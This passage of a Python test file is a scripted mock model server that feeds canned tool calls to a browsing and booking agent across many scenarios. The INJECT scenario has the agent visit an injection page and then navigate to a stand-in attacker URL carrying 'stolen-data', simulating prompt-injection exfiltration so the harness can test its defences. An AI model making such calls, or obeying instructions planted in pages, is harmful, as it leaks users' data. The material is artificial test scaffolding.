                {"derive": [{"as": "seg", "from": "nps", "bins": [0, 7, 9, 11], "labels": ["det", "pas", "pro"]}],
                 "group_by": ["seg"], "agg": [{"fn": "count"}, {"fn": "count_share", "as": "pct"}], "sort": ["seg"]},
                {"where": [{"col": "age", "op": ">=", "value": 50}], "agg": [{"col": "nps", "fn": "mean"}], "save": "data/out.csv"},
                {"group_by": ["nope"]}])})])
        if n == 4:
            return reply("", [tc("data_query", {"path": "data/app.log",
                                                "pattern": r'^(?P<time>\S+) \S+ "GET (?P<path>[^"]+)" (?P<status>\d{3}) (?P<ms>\d+)ms',
                                                "queries": [{"derive": [{"as": "err", "expr": "status >= 500"}], "group_by": ["path"],
                                                             "agg": [{"col": "err", "fn": "sum", "as": "errors"}, {"col": "ms", "fn": "p95"}],
                                                             "sort": [{"col": "errors", "desc": True}]}]})])
        return reply("DATAQ RESULTS:\n" + "\n=====\n".join(str(m["content"])[:3000] for m in tools_done))
    if "CALCTEST" in goal:   # calculate: exact loan maths instead of the model's guesses
        if n == 0:
            return reply("", [tc("calculate", {"expressions": ["loan(3000000, 3.5, 25, 2)", "pmt(r, 300, 3e6)", "1/0"],
                                               "variables": json.dumps({"r": "0.035/12"})})])
        return reply("CALC RESULTS:\n" + "\n".join(str(m["content"]) for m in tools_done))
    if "FUNDTEST" in goal:   # stock_fundamentals: valuations + reported financials, unknown ticker reported
        if n == 0:
            return reply("", [tc("stock_fundamentals", {"symbols": ["TSLA", "1211.HK", "NOPE.XX"]})])
        return reply("FUND RESULTS:\n" + "\n=====\n".join(str(m["content"])[:6000] for m in tools_done))
    if "REMAKEXLSX" in goal:   # the 2026-10-02 itinerary run: the same Excel file re-made again and again
        if n < 6:
            return reply("", [tc("make_xlsx", {"output": "trip.xlsx", "sheets": [{"name": "Plan", "columns": ["Day", "Cost"],
                                                                                   "rows": [["D1", 100 + n]]}]})])
        return reply("REMAKE DONE:\n" + "\n=====\n".join(str(m["content"])[:400] for m in tools_done))
    if "MARKUPFINAL" in goal:   # the 2026-10-02 Tesla run: a final answer (no tools offered) that was only tool-call markup
        if b.get("tools"):
            return reply("", [tc("browser_navigate", {"url": PAGE + f"?m={n}"})])
        if "<tool_call>" not in allu:   # the nudge (zh or en) names the markup
            return reply('<tool_call>\n<function=update_plan>\n<parameter=steps>\n[{"id": "s1", "status": "done"}]\n'
                         '</parameter>\n</function>\n</tool_call>')
        return reply("MARKUP FIXED: plain answer")
    if "CHARTTEST" in goal:   # make_chart: a line chart shown in the chat, a bad spec, a flow chart embedded in a PDF
        if n == 0:
            return reply("", [tc("make_chart", {"type": "line", "title": "腾讯 0700.HK 近一年", "source": "测试数据",
                                                "labels": ["2025-10", "2025-11", "2025-12", "2026-01"],
                                                "series": json.dumps([{"name": "收盘价", "values": [410, 435, 452, 470]}])})])
        if n == 1:
            return reply("", [tc("make_chart", {"type": "bar", "title": "坏数据", "labels": ["a", "b"], "values": [1]})])
        if n == 2:
            return reply("", [tc("make_chart", {"type": "flow", "title": "报销流程", "steps": ["提交", "主管审批", "财务审核", "付款"],
                                                "send": False})])
        if n == 3:
            return reply("", [tc("make_pdf", {"markdown": "# 报告\n\n![流程](charts/报销流程.png)\n", "output": "reports/chart_report.pdf"})])
        return reply("CHART RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
    if "SLOWTASK" in goal:   # a slow research task: told to wrap up at 70% of the time budget, answers at 100%
        if not b.get("tools"):
            return reply(f"SLOW SUMMARY after {n} pages; wrap-up note seen: {'time budget' in allu}")
        import asyncio as _a
        await _a.sleep(4)
        return reply("", [tc("browser_navigate", {"url": PAGE + f"?page={n}"})])
    if "STUCKLOOP" in goal:   # the 2026-10-02 HSBC run: the same Google Finance link, 3 copies per turn, forever
        if not b.get("tools"):
            return reply(f"STUCK SUMMARY after {n} tool results; asked to stop: {'停止重试' in allu or 'retrying has stopped' in allu}")
        url = "http://shop.test:8099/page.html?quote=HSBC&window=5Y"
        return reply("", [tc("browser_navigate", {"url": url}), tc("browser_navigate", {"url": url}),
                          tc("browser_navigate", {"url": url})])
    if "SWITCHSRC" in goal:   # a source that keeps failing: after 3 failures the host is blocked, the agent switches site
        dead_seen = "Dead ends in this task" in allu
        if n < 4:
            return reply("", [tc("browser_navigate", {"url": f"http://nosuch.test:8099/quote{n}"})])
        if n == 4:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        return reply(f"SWITCH OK dead_ends_in_prompt={dead_seen} last={last_tool[:120]}")
    if "LOOPFEED" in goal:   # a model stuck re-opening the same RSS feed (the 2026-09-28 news-brief run)
        if not b.get("tools"):
            return reply(f"LOOP SUMMARY after {n} tool calls: feed read, email not sent.")
        return reply("", [tc("browser_navigate", {"url": PAGE.rsplit('/', 1)[0] + "/feed.xml"})])
    if "BUYTEST" in goal:        # batch 3: one approved purchase → order number → ledger
        if n == 0:
            return reply("", [tc("purchase_confirm", {"site": "shop.test", "items": [{"name": "Kiprun socks", "qty": 1, "price": 4.9}],
                                                      "shipping": 0, "total": 4.9, "currency": "SGD", "delivery": "Home delivery"})])
        if n == 1:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "checkout_ledger.html")})])
        if n == 2:
            m = re.search(r"\[(e\d+)\] button \\\"Place order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
        return reply("下单成功，订单号：OM-77821，总价 S$4.90，送货到家。")
    if "CANCELTEST" in goal:     # batch 3: cancel goes through the ledger
        page = "order_other.html" if "OTHER" in goal else "order_ledger.html"
        if n == 0:
            return reply("", [tc("orders_list", {"query": ""})])
        if n == 1:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", page)})])
        if n == 2:
            m = re.search(r"\[(e\d+)\] button \\\"Cancel order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
        return reply(f"Cancel step done. {last_tool[:200]}")
    if "SITECHECK" in goal:      # batch 2: what OMuse learned about a site shows up when it opens
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        return reply(f"Opened. {last_tool[:200]}")
    if "LEARNSITE" in goal:      # batch 2: a habit learned by OMuse itself
        if n == 0:
            return reply("", [tc("memory_remember", {"fact": "shop.test allows guest checkout; the phone goes in as 8 digits.", "domain": "site"})])
        return reply(f"Learned. {last_tool[:200]}")
    if "SEND" in goal:
        if n == 0:
            return reply("I'll send it.", [tc("gmail_send", {"to": "john@example.com", "subject": "Tuesday", "body": "Tuesday 3pm works."})])
        return reply(f"Done. Result: {last_tool[:200]}")
    if "BROWSE" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        if n == 1:
            m = re.search(r"\[(e\d+)\] button \\\"Submit order", last_tool) or re.search(r"\[(e\d+)\] button", last_tool)
            return reply("", [tc("browser_click", {"ref": m.group(1) if m else "e1"})])
        return reply(f"Browsed. Last: {last_tool[:300]}")
    if "TYPEPW" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE})])
        if n == 1:
            m = re.search(r"\[(e\d+)\] textbox \\\"Password", last_tool)
            return reply("", [tc("browser_type", {"ref": m.group(1) if m else "e1", "text": "hunter2"})])
        return reply(f"Typed. {last_tool[:300]}")
    if "MEDIASHOP" in goal:   # save photos + a video from a page and send them into the chat as one gallery
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "gallery.html")})])
        if n == 1:
            def ref(pat):
                m = re.search(r"\[(e\d+)\] " + pat, last_tool)
                return m.group(1) if m else "e999"
            return reply("", [tc("browser_save_media", {"ref": ref(r'img \\"Velvet lipstick')}),
                              tc("browser_save_media", {"ref": ref(r'link \\"Glow serum')}),
                              tc("browser_save_media", {"ref": ref(r'video ')})])
        if n == 4:
            paths = re.findall(r'"saved": "(media/[^"]+)"', "\n".join(m["content"] for m in tools_done[-3:]))
            return reply("", [tc("send_file", {"paths": paths, "note": "OMG best sellers"})])
        return reply(f"MEDIADONE {last_tool[:300]}")
    if "ATTACHTEST" in goal:   # files attached to the message: their content arrives with the message
        return reply("ATTACHOK docx=" + str("Quarterly report" in goal) + " img=" + str("VISION-SEEN" in goal)
                     + " md=" + str("hello-markdown" in goal))
    if "ATTACHFOLLOW" in goal:   # a later message about an earlier attachment: the agent looks at it again
        if n == 0:
            m = re.search(r"- (uploads/[^\n]+?\.png) \(", sys)
            return reply("", [tc("file_look", {"path": m.group(1) if m else "x.png", "question": "what colour?"})])
        return reply(f"FOLLOWOK {last_tool[:200]}")
    if "VAULTFILL" in goal:   # fill a membership number from the vault (approved), then try to look at the page
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "checkout.html")})])
        if n == 1:
            return reply("", [tc("vault_list", {})])
        if n == 2:
            m = re.search(r"id=(vlt_\w+) · KrisFlyer", last_tool)
            snap = tools_done[0]["content"]
            r = re.search(r"\[(e\d+)\] textbox \\\"Membership", snap)
            return reply("", [tc("browser_fill_secret", {"ref": r.group(1) if r else "e2", "item_id": m.group(1) if m else "x", "field": "number"})])
        if n == 3:
            return reply("", [tc("browser_snapshot", {})])
        if n == 4:
            return reply("", [tc("browser_look", {"question": "what is in the membership field?"})])
        return reply(f"VAULTDONE {last_tool[:400]}")
    if "TAKEOVERLOOP" in goal:   # the site is still blocked after a hand-back: asks once more, then gives up
        if n < 2:
            return reply("", [tc("browser_request_takeover", {"reason": "still blocked on zipair"})])
        return reply(f"Gave up: {last_tool[:200]}")
    if "TAKEOVER" in goal:
        if n == 0:
            return reply("", [tc("browser_request_takeover", {"reason": "please log in"})])
        return reply(f"After takeover: {last_tool[:200]}")
    if "INJECT" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": PAGE.replace("page.html", "inject.html")})])
        if n == 1:
            return reply("", [tc("browser_navigate", {"url": "http://evil.test:8099/page.html?d=stolen-data"})])
        return reply(f"Done: {last_tool[:300]}")
    if "RESEARCH SUBJECT" in goal:   # library_e2e.py: write the report (two appends), then the summary
        m = re.search(r"library/([\w-]+)/report\.md", goal)
        path = f"library/{m.group(1)}/report.md" if m else "library/x/report.md"
        if "REFRESH" in goal:
            if n == 0:
                return reply("", [tc("files_read", {"path": path})])
            if n == 1:
                return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n- 2026-10-11: refresh — prices rechecked, no change\n"})])
            return reply("Refreshed: no changes.")
        if n == 0:
            return reply("", [tc("files_write", {"path": path, "content": "# Home NAS 2026\n_Brief: budget under 1000_\n\n## Summary\n(tbd)\n\n## Candidates\nSynology DS925+ costs about 650 dollars and has four bays (source: synology.com, 2026-10-10).\nUGREEN DXP4800 costs about 500 dollars and runs Docker (source: ugreen.com, 2026-10-10).\n"})])
        if n == 1:
            return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n## Open questions\nNoise levels not found.\n\n## Sources\n- https://www.synology.com/\n- https://ugreen.com/\n\n## Changelog\n- 2026-10-10: initial research\n"})])
        return reply("Report saved to " + path + ". Summary: UGREEN DXP4800 is the cheapest four-bay NAS with Docker.")
    if "LIBUPDATE" in goal:   # a chat in a subject's conversation that asks for a change
        m = re.search(r"Report file: (library/[\w-]+/report\.md)|报告文件是 (library/[\w-]+/report\.md)", sys)
        path = (m.group(1) or m.group(2)) if m else "library/x/report.md"
        if n == 0:
            return reply("", [tc("files_write", {"path": path, "append": True, "content": "\n## Noise\nThe DS925+ is rated 20 dB at idle (source: synology.com, 2026-10-11).\n- 2026-10-11: added noise section\n"})])
        return reply("Added a Noise section to the report." + (" CTX_OK" if "Current report" in sys or "当前报告" in sys else " CTX_MISSING"))
    if "LIBSEARCH" in goal:   # any task can draw on the library
        if n == 0:
            return reply("", [tc("library_search", {"query": "Docker NAS"})])
        return reply("From the library: " + last_tool[:300])
    if "REMEMBER" in goal:
        if n == 0:
            return reply("", [tc("memory_remember", {"fact": "Lucas likes quiet hotels", "category": "preference"})])
        return reply("好的，我记住了。")
    if "SCHEDULE" in goal:
        if n == 0:
            return reply("", [tc("schedule_create", {"name": "daily brief", "goal": "summarize email", "kind": "cron", "spec": "0 8 * * *"})])
        return reply(f"Created: {last_tool}")
    if "MDTABLE" in goal:
        return reply("我查看了最近 7 天的收件箱，下面是需要你关注的内容：\n\n## 📬 本周邮件概况\n\n| # | 发件人 | 主题 | 建议 |\n|---|---|---|---|\n"
                     "| 1 | John Smith <john.smith@verylongcompanyname-example.com> | Q3 partnership proposal and revised pricing sheet | 需要回复 |\n"
                     "| 2 | GitHub | [beclab/apps] PR #3688 merged: Junior Investor update | 无需回复 |\n"
                     "| 3 | Bluehost | More server locations now available | 可退订 |\n\n"
                     "### 结论\n\n- ✅ **无需回复**：大多数是自动通知\n- ⚠️ **需要处理**：John 的合作提案，建议周二前回复\n\n"
                     "```\ndeploy:shadow-trader-combination-2.3h:nav failed at step verify_data_consistency_check_with_a_very_long_identifier\n```\n\n"
                     "参考链接：https://example.com/a/very/long/path/that/keeps/going/and/going/without/any/spaces/at/all/for/testing")
    if "inbox this week" in goal:
        if n == 0:
            return reply("", [tc("notion_search", {"query": "plan"})])
        if n == 1:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        return reply("I went through **42 emails** from the last 7 days. Three need you:\n\n"
                     "| # | From | Subject | Suggested action |\n|---|---|---|---|\n"
                     "| 1 | John Smith (Acme) | Contract terms — final version | Reply: confirm Tuesday 3pm call |\n"
                     "| 2 | Maria Chen | Q4 launch budget | Reply: approve, ask for the timeline |\n"
                     "| 3 | Stripe | Payout on hold — action needed | Update bank details in the dashboard |\n\n"
                     "### Drafts ready\n- ✉️ **Reply to John** — saved as a Gmail draft, sending needs your approval\n"
                     "- ✉️ **Reply to Maria** — saved as a draft, references the Q4 plan in Notion (launch in October)\n\n"
                     "### Nothing to do\n- 31 newsletters and notifications — 12 of them can be unsubscribed in one click\n\n"
                     "Want me to send both replies now? I'll ask Sentinel for approval first.")
    if "Q4 plan summary" in goal:
        if n == 0:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        if n == 1:
            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "📌 *Q4 plan* — we ship OMuse 0.2 in October. Goals: 1) launch on Olares Market 2) 100 beta users 3) Notion & Slack integrations. Full plan in Notion."})])
        return reply("Posted to #general ✓")
    if "Get John to confirm" in goal and "GOAL" not in goal and "goal_update" in json.dumps(b.get("tools") or []):
        if n == 0:
            return reply("", [tc("goal_update", {"status": "active", "progress": "John opened the email but hasn't replied yet. Drafted a polite follow-up for tomorrow 9:00 (sending needs your approval)."})])
        return reply("Progress recorded.")
    if "TRIGGERTEST" in goal:
        if "UNTRUSTED" not in goal or "<untrusted_content" not in goal:
            return reply("TRIGGER_NO_EVENTS")
        return reply("Trigger handled: " + goal.split("<untrusted_content", 1)[1][:300])
    if "GOALACHIEVE" in goal:
        if n == 0:
            return reply("", [tc("goal_update", {"status": "achieved", "progress": "John confirmed the contract."})])
        return reply("Goal achieved: " + last_tool[:100])
    if "GOALSILENT" in goal:
        return reply("Checked, nothing new yet.")
    if "GOALCREATE" in goal:
        if n == 0:
            return reply("", [tc("goal_create", {"title": "Contract GOALACHIEVE", "objective": "Get John to confirm the contract",
                                                 "success_criteria": "John replies yes", "check_kind": "interval", "check_spec": "60",
                                                 "deadline": "2030-01-01"})])
        return reply("Created: " + last_tool[:200])
    if "SLACKNOTION" in goal:
        if n == 0:
            return reply("", [tc("notion_get_page", {"page_id": "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"})])
        if n == 1:
            return reply("", [tc("slack_send_message", {"channel": "#general", "text": "Q4 plan: Ship OMuse 0.2"})])
        return reply("Posted: " + last_tool[:200])
    if "MCPNOTES" in goal:
        names = [t["function"]["name"] for t in b.get("tools") or []]
        if n == 0:
            if "mcp_notes__notes_search" not in names:
                return reply("NO_MCP_TOOL " + ",".join(x for x in names if x.startswith("mcp_")))
            return reply("", [tc("mcp_notes__notes_search", {"query": "q3"})])
        if n == 1:
            return reply("", [tc("mcp_notes__notes_create", {"title": "Summary", "text": "Q3: " + last_tool[-80:]})])
        return reply("MCP done: " + last_tool[:200])
    if "XMLTOOL" in goal:
        if n == 0:
            return reply('<tool_call>{"name": "files_write", "arguments": {"path": "notes/a.md", "content": "hello"}}</tool_call>')
        return reply("<think>hidden</think>Wrote file: " + last_tool)
    for _kw, _kind in (("FLIGHTBOOK", "flight"), ("HOTELBOOK", "hotel"), ("MICHELINBOOK", "michelin")):
        if _kw in goal:   # travel_*_e2e.py: data connector first, the browser only for the booking page
            return travel_book(_kind, goal, msgs, tnames)
    return reply("<think>reasoning here</think>你好！这是一个普通回答。")


@app.get("/calls_for")
async def calls_for(marker: str):
    """Executor requests whose conversation contains `marker`: the system prompt and the last message of each."""
    out = []
    for b in CALLS:
        ms = b.get("messages") or []
        if any(marker in str(m.get("content")) for m in ms if m.get("role") == "user") and ms and ms[0].get("role") == "system" \
                and "planning module" not in str(ms[0].get("content")):
            out.append({"system": ms[0]["content"], "last": str(ms[-1].get("content")), "n": len(ms),
                        "tools": "\n".join(str(m.get("content")) for m in ms if m.get("role") == "tool")})
    return out


@app.get("/calls")
def calls():
    return {"n": len(CALLS), "last": CALLS[-1] if CALLS else None}


def fake_vision(content):
    """Stand-in for a vision model: checks the screenshot really is an image with red set-of-marks boxes,
    then picks the 'nicest' case from the label list (the glittery one, as a person might)."""
    import base64, io
    from PIL import Image
    parts = content if isinstance(content, list) else []
    text = " ".join(p.get("text", "") for p in parts if p.get("type") == "text")
    url = next((p["image_url"]["url"] for p in parts if p.get("type") == "image_url"), "")
    if not url.startswith("data:image/"):
        return "NO IMAGE"
    img = Image.open(io.BytesIO(base64.b64decode(url.split(",", 1)[1]))).convert("RGB")
    red = sum(1 for r, g, bl in img.getdata() if r > 200 and g < 60 and bl < 60)
    info = f"(IMG {img.width}x{img.height} RED={red})"
    if "added to the cart" in text:
        m = re.search(r"(\d+) items? in cart", text)
        added = re.search(r"Added to Cart: ([^\n\"]+)", text)
        return f"The cart shows {m.group(1) if m else '?'} items in cart. {('Message: Added to Cart: ' + added.group(1)) if added else ''} {info}"
    m = re.search(r"\[((?:f\d+)?e\d+)\] button \"Open chat widget\"", text)
    if m:
        return f"A round blue chat button sits in the bottom-right corner. To open the chat, click [{m.group(1)}]. {info}"
    m = re.search(r"\[(f\d+e\d+)\] textbox \"Message\"", text)
    if m:
        return f"The messaging window on the right has a Message box; click [{m.group(1)}] to type. {info}"
    m = re.search(r"\[(e\d+)\] link \"[^\"]*Aurora Glitter Case", text)
    if m:
        return f"The Aurora Glitter Case (4.4 out of 5 stars, S$21.90) looks the nicest — sparkly purple. To open it, click [{m.group(1)}]. {info}"
    return f"I can see the page but not the product list here; scroll down. {info}"


def fake_locate(sys, content):
    """Stand-in vision model for browser_locate: finds the target by its colour (blue chat bubble / yellow message box)
    and answers with the grid cell, the zoomed cell number, or YES/NO for the red marker — exercising the real geometry."""
    import base64, io
    from PIL import Image
    parts = content if isinstance(content, list) else []
    text = " ".join(p.get("text", "") for p in parts if p.get("type") == "text").lower()
    url = next((p["image_url"]["url"] for p in parts if p.get("type") == "image_url"), "")
    img = Image.open(io.BytesIO(base64.b64decode(url.split(",", 1)[1]))).convert("RGB")
    want = (0, 102, 255) if "bubble" in text else (255, 235, 59) if "message" in text else None
    if not want:
        return "NONE"
    W, H = img.size
    px = img.load()
    xs = ys = cnt = 0
    for y in range(0, H, 2):
        for x in range(0, W, 2):
            r, g, b = px[x, y]
            if abs(r - want[0]) < 45 and abs(g - want[1]) < 45 and abs(b - want[2]) < 45:
                xs += x; ys += y; cnt += 1
    if cnt < 8:
        return "NONE"
    cx, cy = xs / cnt, ys / cnt
    if sys.startswith("You locate things"):
        return "ABCDEFGH"[min(7, int(cx / (W / 8)))] + str(min(6, int(cy / (H / 6)) + 1))
    if sys.startswith("This is a zoomed-in part"):
        return str(min(5, int(cy / (H / 6))) * 8 + min(7, int(cx / (W / 8))) + 1)
    rx = ry = rn = 0
    for y in range(0, H, 2):
        for x in range(0, W, 2):
            r, g, b = px[x, y]
            if r > 210 and g < 50 and b < 50:
                rx += x; ry += y; rn += 1
    if not rn:
        return "NO — no red marker visible"
    d = ((rx / rn - cx) ** 2 + (ry / rn - cy) ** 2) ** 0.5
    return f"YES — the marker is on the {'chat bubble' if want[0] == 0 else 'message box'} (off by {d:.0f}px)" if d < 25 \
        else f"NO — the marker is {d:.0f}px away from it"


# ---------------------------------------------------------------- travel booking scenarios (travel_*_e2e.py)
# FLIGHTBOOK / HOTELBOOK / MICHELINBOOK: load_skill → the travel connector's MCP tools → present_choices → vault_list (when a
# card or passport is needed) → purchase_confirm → browser_navigate(booking_url) → browser_type / browser_fill_secret →
# click the confirm button (approval or covered by the purchase) → final answer quoting the booking reference.
TRAVELLER = {"name": "Lucas Lu", "email": "lucas@example.com", "phone": "+65 8000 0000"}


def _travel_calls(msgs):
    """[(name, args, result text)] of every tool call so far, in order."""
    res = {m.get("tool_call_id"): str(m.get("content") or "") for m in msgs if m.get("role") == "tool"}
    out = []
    for m in msgs:
        if m.get("role") != "assistant":
            continue
        for c in m.get("tool_calls") or []:
            fn = c.get("function") or {}
            try:
                args = json.loads(fn.get("arguments") or "{}") if isinstance(fn.get("arguments"), str) else (fn.get("arguments") or {})
            except ValueError:
                args = {}
            out.append((fn.get("name", ""), args, res.get(c.get("id"), "")))
    return out


def _json_find(text, key):
    """The first JSON object holding `key` anywhere in a tool result (the data sits as a JSON string inside the envelope)."""
    def walk(o):
        if isinstance(o, dict):
            if key in o:
                return o
            vals = o.values()
        elif isinstance(o, list):
            vals = o
        elif isinstance(o, str) and o.lstrip()[:1] in ("{", "["):
            try:
                return walk(json.loads(o))
            except ValueError:
                return None
        else:
            return None
        for v in vals:
            r = walk(v)
            if r is not None:
                return r
        return None
    dec = json.JSONDecoder()
    for i, ch in enumerate(text):
        if ch != "{":
            continue
        try:
            obj, _ = dec.raw_decode(text, i)
        except ValueError:
            continue
        r = walk(obj)
        if r is not None:
            return r
    return None


def _snap_ref(text, label, role=r"\w+"):
    m = re.search(r"\[((?:f\d+)?e\d+)\]\s+" + role + r"\s+\\*\"" + re.escape(label), text)
    return m.group(1) if m else None


def _vault_id(text, kind):
    for line in text.replace("\\n", "\n").splitlines():
        m = re.search(r"(vlt_\w+)", line)
        if m and f"· {kind} ·" in line:
            return m.group(1)
    return None


def travel_book(kind, goal, msgs, tnames):
    import datetime as _dt
    calls = _travel_calls(msgs)
    names = [c[0] for c in calls]

    def tool(suffix):
        return next((t for t in tnames if t.endswith("__" + suffix)), None)

    def has(suffix):
        return any(n == suffix or n.endswith("__" + suffix) for n in names)

    def result(suffix):
        return next((r for n, _, r in reversed(calls) if n == suffix or n.endswith("__" + suffix)), "")

    dates = re.findall(r"\d{4}-\d{2}-\d{2}", goal) or [str(_dt.date.today() + _dt.timedelta(days=21))]
    skill = {"flight": "flight-booking", "hotel": "hotel-booking", "michelin": "michelin-dining"}[kind]
    if not has("load_skill"):
        return reply("", [tc("load_skill", {"name": skill})])
    data_tools = {"flight": ("flights_search", "flight_offer"), "hotel": ("hotels_search", "hotel_rooms"),
                  "michelin": ("michelin_search", "restaurant_availability")}[kind]
    if not all(tool(x) for x in data_tools):
        return reply("TRAVEL FAIL: no travel connector tools; mcp tools offered: " + ",".join(t for t in tnames if t.startswith("mcp_")))

    # ---- 1. data: search, details, the pick
    if kind == "flight":
        if not has("flights_search"):
            return reply("", [tc(tool("flights_search"), {"origin": "Singapore", "destination": "Tokyo", "date": dates[0],
                                                          "adults": 1, "nonstop_only": True})])
        data = _json_find(result("flights_search"), "offers") or {}
        options = sorted([o for o in data.get("offers") or [] if o.get("stops") == 0], key=lambda o: o["fare_amount"])
        if not options:
            return reply("TRAVEL FAIL: no direct offers in " + result("flights_search")[:600])
        pick = options[0]
        if not has("flight_offer"):
            return reply("", [tc(tool("flight_offer"), {"offer_id": pick["offer_id"]})])
        cards = [{"label": o["title"], "details": [o["schedule"], o["duration"], o["stops_text"], o["fare"]],
                  "source_url": o["booking_url"], "note": ("Cheapest direct. " if i == 0 else "") + o["baggage"]}
                 for i, o in enumerate(options[:3])]
        amount, currency, url = float(pick["fare_amount"]), "SGD", pick["booking_url"]
        item = f"{pick['title']} {pick['schedule']} on {dates[0]}, 1 adult"
        delivery, note = f"E-ticket to {TRAVELLER['email']}", f"{pick['baggage']}. {pick['refund_rules']}"
        need_card, need_passport, button = True, True, "Pay now"
        summary = f"{pick['title']}, {pick['schedule']} ({pick['duration']}, {pick['stops_text']}), total {pick['fare']}"
    elif kind == "hotel":
        ci, co = (dates + [str(_dt.date.fromisoformat(dates[0]) + _dt.timedelta(days=3))])[:2]
        if not has("hotels_search"):
            return reply("", [tc(tool("hotels_search"), {"city": "Tokyo", "check_in": ci, "check_out": co, "guests": 2, "min_stars": 4})])
        hotels = (_json_find(result("hotels_search"), "hotels") or {}).get("hotels") or []
        if not hotels:
            return reply("TRAVEL FAIL: no hotels in " + result("hotels_search")[:600])
        h = hotels[0]
        if not has("hotel_rooms"):
            return reply("", [tc(tool("hotel_rooms"), {"hotel_id": h["hotel_id"], "check_in": ci, "check_out": co, "guests": 2})])
        rooms = [r for r in (_json_find(result("hotel_rooms"), "rooms") or {}).get("rooms") or []
                 if str(r.get("cancellation", "")).startswith("Free")]
        if not rooms:
            return reply("TRAVEL FAIL: no free-cancellation room in " + result("hotel_rooms")[:600])
        rooms.sort(key=lambda r: r["total_amount"])
        pick = rooms[0]
        cards = [{"label": r["room_type"], "details": [h["name"], r["price_per_night"], r["total"], r["cancellation"]],
                  "source_url": r["booking_url"], "note": ("Cheapest with free cancellation. " if i == 0 else "") + r["payment"]}
                 for i, r in enumerate(rooms[:2])]
        amount, currency, url = float(pick["total_amount"]), "SGD", pick["booking_url"]
        item = f"{h['name']} - {pick['room_type']}, {ci} to {co} ({pick['nights']} nights)"
        delivery, note = f"Hotel stay, {pick['payment']}", pick["cancellation"]
        need_card, need_passport, button = False, False, "Confirm booking"
        summary = f"{h['name']} ({h['area']}), {pick['room_type']}, {ci} to {co}, {pick['total']}; {pick['cancellation']}"
    else:
        if not has("michelin_search"):
            return reply("", [tc(tool("michelin_search"), {"city": "Tokyo", "distinction": "2 stars"})])
        rests = (_json_find(result("michelin_search"), "restaurants") or {}).get("restaurants") or []
        if not rests:
            return reply("TRAVEL FAIL: no restaurants in " + result("michelin_search")[:600])
        r0 = rests[0]
        if not has("restaurant_availability"):
            return reply("", [tc(tool("restaurant_availability"), {"restaurant_id": r0["restaurant_id"], "date": dates[0], "party_size": 2})])
        av = _json_find(result("restaurant_availability"), "slots") or {}
        slots = av.get("slots") or []
        if not slots:
            return reply("TRAVEL FAIL: no slots in " + result("restaurant_availability")[:600])
        slots.sort(key=lambda s: abs(int(s["time"][:2]) * 60 + int(s["time"][3:]) - 19 * 60))
        pick = slots[0]
        cards = [{"label": r0["name"], "details": [r0["distinction"], r0["cuisine"], s["time"], r0["deposit_policy"]],
                  "source_url": s["booking_url"], "note": "Closest to 19:00." if i == 0 else "Alternative time."}
                 for i, s in enumerate(slots[:2])]
        dep = str(av.get("deposit_due_now") or "")
        currency = dep.split()[0] if dep and dep != "none" else "JPY"
        amount = float(re.sub(r"[^\d.]", "", dep.split()[-1])) if dep and dep != "none" else 0.0
        url = pick["booking_url"]
        item = f"{r0['name']} {dates[0]} {pick['time']}, 2 guests - deposit"
        delivery, note = "Table reservation", r0["deposit_policy"]
        need_card, need_passport, button = amount > 0, False, "Confirm booking"
        summary = f"{r0['name']} ({r0['distinction']}, {r0['cuisine']}), {dates[0]} at {pick['time']} for 2, deposit {dep}"

    # ---- 2. show the options (the request already says which one to book, so go on)
    if not has("present_choices"):
        return reply("", [tc("present_choices", {"question": "Which one should I book?", "kind": "comparison", "options": cards})])
    if (need_card or need_passport) and not has("vault_list"):
        return reply("", [tc("vault_list", {})])
    vl = result("vault_list")
    card_id, passport_id = _vault_id(vl, "card"), _vault_id(vl, "id_document")
    if amount > 0 and not has("purchase_confirm"):
        args = {"site": url.split("/")[2].split(":")[0], "items": [{"name": item, "qty": 1, "price": amount}], "shipping": 0,
                "total": amount, "currency": currency, "delivery": delivery, "note": note}
        if need_card and card_id:
            args["card_item_id"] = card_id
        return reply("", [tc("purchase_confirm", args)])

    # ---- 3. the booking page: one navigate, fill, one click
    if not has("browser_navigate"):
        return reply("", [tc("browser_navigate", {"url": url})])
    page = result("browser_navigate")
    if not has("browser_type"):
        fields = [("Full name", TRAVELLER["name"]), ("Email", TRAVELLER["email"]), ("Phone", TRAVELLER["phone"])]
        typed = [tc("browser_type", {"ref": _snap_ref(page, lbl), "text": v}) for lbl, v in fields if _snap_ref(page, lbl)]
        if not typed:
            return reply("TRAVEL FAIL: no form fields on the booking page: " + page[:800])
        return reply("", typed)
    fills = [a for n, a, _ in calls if n == "browser_fill_secret"]
    if need_passport and passport_id and not any(a.get("item_id") == passport_id for a in fills):
        return reply("", [tc("browser_fill_secret", {"ref": _snap_ref(page, "Passport number") or "e1", "item_id": passport_id,
                                                     "field": "number"})])
    if need_card and card_id and not any(a.get("item_id") == card_id for a in fills):
        boxes = [("Card number", "number"), ("Expiry", "expiry"), ("CVC", "cvc"), ("Name on card", "holder")]
        return reply("", [tc("browser_fill_secret", {"ref": _snap_ref(page, lbl), "item_id": card_id, "field": f})
                          for lbl, f in boxes if _snap_ref(page, lbl)])
    if not has("browser_click"):
        ref = _snap_ref(page, button, "button")
